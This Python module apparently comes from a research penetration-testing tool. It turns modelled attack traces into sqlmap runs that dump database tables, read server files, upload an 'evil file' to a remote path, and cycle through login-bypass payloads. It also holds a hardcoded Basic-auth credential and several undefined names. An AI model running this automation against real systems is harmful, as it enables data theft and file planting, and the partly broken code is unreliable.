
#!/usr/local/bin/python3.5

"""
This module provides sql-injection extension
"""
import re
import config
import requests
import linecache
import json
import threading

from modules.logger import cprint
from modules.wrapper import sqlmap

# --==[ SQL Injection ]==--
# 1: whenever I find a sqli somewhere, look for i -> webapp : tuple(of_the_same_sqli)
#    if found, data extraction is performed and thus inside the sqli array I'll have
#    and entry [a,idx] where idx is the line where the injection should be performed
# 2: if I don't perform a data extraction, a 0 should appear
# 3: sqli.lfi identifies a sql-injection for reading
# 4: sqli.evil_file identifies a sql-injection for writing
# 


# Matrix form:
# [ ['a',[( tag_where_to_exploit, [ parameters_to_exploit ])]],
#         ['n',0]
#         ['e',0] ]
# Where  a: attack
#        n: normal request
#        e: exploit
"""
Understands sql-injection attacks on the message sequence chart.
msc_table: is the message sequence chart table
extended: is a JSON structure that extendes the msc_table for concretizing
            attacks
"""
def sqli(msc_table,extended):
    cprint("Starting extend_trace_sqli","D")
    sqli = []
    injection_point = ""
    for idx, message in enumerate(msc_table):
        cprint(message,"D")
        tag = message[0]
        message = message[1]
        if message and len(message) == 3:
            # read message and check if it's a request and require an SQLi
            if (not message[0] == "webapplication") and "sqli" in message[len(message)-1] and not "tuple" in message[len(message)-1]:
                cprint("there is a sqli","D")
                cprint(message,"D")
                cprint("---------------","D")
                # now we should check what kind of sqli isa
                # is sqli is followed by evil_file, is a writing
                if( "sqli.evil_file" in message[len(message)-1] ):
                    entry = {"attack":2}
                    extended[tag] = entry
                    sqli.append(["w",0])
                # if is not a writing we check if sqli is followed by anything that starts with a lower-case letter
                elif( re.search('sqli\.[a-z]',message[len(message)-1]) != None ):
                    entry = {"attack":1}
                    extended[tag] = entry
                    sqli.append(["r",0])
                # otherwise is "standard" sqli
                else:
                    entry = {"attack":0}
                    extended[tag] = entry
                    sqli.append(["a",[]])
                injection_point = idx
            # we are exploiting a sqli, find the column that should be retrieved
            # .([a-z]*?).tuple
            elif "webapplication" in message[1] and "tuple" in message[len(message)-1] and "sqli" in message[len(message)-1]:
                #param_regexp = re.compile(r'(.*?).tuple\(')
                param_regexp = re.compile(r'\.?([a-zA-Z]*?)\.tuple')
                params = param_regexp.findall(message[len(message)-1])
                cprint("exploiting sqli here","D")
                cprint("Message:","D")
                cprint(message,"D")
                cprint("Params: ","D")
                cprint(params,"D")
                cprint(tag,"D")
                cprint("--------------------","D")
                # create a multiple array with params from different lines
                t = msc_table[injection_point][0]
                extended[t]["params"] = {tag:params}
                extended[tag] = {"attack": 6}
                sqli[injection_point][1].append((tag,params))
                sqli.append(["e",injection_point])
            else:
                if tag not in extended:
                    extended[tag] = {"attack":-1}
                    sqli.append(["n",0])
    cprint(sqli,"D")
    return sqli


def sqlmap_parse_data_extracted(sqlmap_output):
    global data_to_extract
    # Let's parse the data extracted
    cprint(sqlmap_output,"D")
    extracted_values = {}
    cprint(data_to_extract,"D")
    for tblcol in data_to_extract:
        cprint(tblcol,"D")
        tbl_list = tblcol.split(".")
        cprint(tbl_list[1],"D")
        tmp_table = tbl_list[0]
        tmp_column = tbl_list[1]
        try:
            extracted_values[tmp_table]
        except KeyError:
            extracted_values[tmp_table] = {}
        try:
            extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
        except Exception:
            #cprint(sqlmap.get_log(task),"V")
            cprint("error in the sqlmap output","E")
            sqlmap.kill
            cprint(sqlmap_output,"D")
            exit()
        cprint("Ending sqlmap extraction","D") 
        sqlmap.kill()
    return extracted_values


"""
Return the initialization structur for executing sqlmap. (Readability method)
"""
def sqli_init(message,concretization_details,concretization_data,idx):
    # message format
    # ('tag1', ('<i>', 'webapplication', 'u.sqli.secureFile.p.Password(121)'))
    request_message = message[1][2]
    attack = concretization_details["attack"]

    cprint("sqli attack","D")
    cprint(message,"D")
    cprint(concretization_details,"D")
    tag = message[0]
    
    # we first deal with the concretization parameters needed for all initialization
    sqli_init = {}
    sqli_init["url"] = concretization_data[tag]["url"]
    sqli_init["method"] = concretization_data[tag]["method"]
    # now create the params
    params = {}
    for k,v in concretization_data[tag]["params"].items():
        tmp = v.split("=")
        params[tmp[0]] = tmp[1]
    sqli_init["params"] = params

    # this code executes only if we read from filesystem
    if attack == 1:
        file_read = []
        # get the name of the file to retrieve
        abstract_file_to_retrieve = re.search(r'sqli\.([a-zA-Z]*)',request_message).group(1)
        cprint(tag_file_to_retrieve,"D")
        real_file_to_retrieve = concretization_data["files"][abstract_file_to_retrieve]
        cprint("file to read: " + real_file_to_retrieve,"D")
        sqli_init["read"] = real_file_to_retrieve


    # this code executes only if we extract dara from the database
    if attack == 0:
        # data to extract
        extract = []
        exploitations = concretization_details["params"]
        cprint("Exploitations","D")
        cprint(exploitations,"D")
        for idx,tag in enumerate(exploitations):
              exploit_points = exploitations[tag]
              for k in exploit_points:
                  try:
                      tmp_map = concretization_data[tag]["params"][k].split("=")[0]
                  except KeyError:
                      tmp_map = concretization_data[tag]["cookies"][k].split("=")[0]
                  tmp_table = concretization_data[tag]["tables"][tmp_map]
                  extract.append(tmp_table)
        sqli_init["extract"] = extract

    # this code executes only if we extract data from database
    if attack == 2:
        # in this case we upload a custom script which depends on
        # the execution itself
        abstract_evil_file = re.search(r'sqli\.([a-zA-Z_]*)',request_message).group(1)
        real_evil_file = concretization_data["files"][abstract_evil_file]
        cprint("file to write: " + real_evil_file,"D")
        
        sqli_init["write"] = real_evil_file

        

    return sqli_init
    
def execute_sqlmap(sqlmap_details):
    global data_to_extract
    cprint(sqlmap_details,"D")
    url = sqlmap_details["url"]
    method = sqlmap_details["method"]
    params = sqlmap_details["params"]

    cprint("run sqlmapapi.py")
    sqlmap.run_api_server()
    task = sqlmap.new_task()

    # hardcoded configuration for the univr server
    # TODO: make it configurable from the command line
    sqlmap.set_option("authType","Basic",task)
    sqlmap.set_option("authCred","regis:password",task)
    #sqlmap.set_option("dropSetCookie","false",task)

    # set cookie if present and should be considered
    if config.keep_cookie and config.cookies != None:
        c = ""
        for k,v in config.cookies.items():
            c = c + k + "=" + v + ";"
        cprint("sqlmap with cookie","D")
        cprint(c,"D")
        sqlmap.set_option("cookie",c,task)

    url_params = ""
    for k,v in params.items():
        url_params = url_params+k+"="+v+"&"
    url_params = url_params[:-1]
    if method == "GET":
        url = url+"?"+url_params
        sqlmap.set_option("url",url,task)
    elif method == "POST":
        sqlmap.set_option("url",url,task)
        sqlmap.set_option("data",url_params,task)

    try:
        data_to_extract = sqlmap_details["extract"]
        cprint(data_to_extract,"D")
        sqlmap.set_option("dumpTable","true",task)
        # set data extraction only if we have data to extract
        col = ""
        tbl = ""
        for tblcol in data_to_extract:
            tbl_list = tblcol.split(".")
            cprint(tbl_list[0],"D")
            # TODO: in here we're basically rewriting the table name
            # whenever we find a new one
            tbl = tbl_list[0]
            col = col + tbl_list[1]
        sqlmap.set_option("tbl",tbl,task)
        sqlmap.set_option("col",col,task)
    except KeyError:
        pass
    try:
        file_to_extract = sqlmap_details["read"]
        # ask if you want to change the file or continue ? 
        sqlmap.set_option("rFile",file_to_extract,task)
    except KeyError:
        pass
    try:

        file_to_write = sqlmap_details["write"]
        if not isfile(file_to_write):
            cprint("Error: evil file not found","E")
            exit()
        cprint(dirname(realpath(__file__)))
        sqlmap.set_option("wFile",join(".",file_to_write),task)
        cprint("In which remote path you want to try to upload the file?")
        path = input()
        sqlmap.set_option("dFile",path,task)
    except KeyError:
        pass

    cprint("sqlmap analysis started")
    sqlmap.start_scan(url,task)
    cprint(url,"D")
    cprint(method,"D")
    cprint(params,"D")

    stopFlag = threading.Event()
    sqlmap_output = ""
    while not stopFlag.wait(5):
        r = sqlmap.get_status(task)
        if "terminated" in r:
            cprint(sqlmap.get_log(task),"D")
            cprint("sqlmap analysisnalysis terminated")
            sqlmap_output = sqlmap.get_data(task)
            stopFlag.set()
        else:
            cprint("sqlmap analysis in progress ... ")
            cprint(sqlmap.get_log(task),"D")

    return sqlmap_output


def execute_bypass(s,request,check):
    # now let's change the params
    params = request["params"]
    for park, parv in params.items():
        if parv == "?":
            with open("bypasspayloads.txt") as f:
                for line in f.readlines():
                    params[park] = line.rstrip()
                    r = __execute_request(request)
                    if check in r.text:
                        return True
    return False
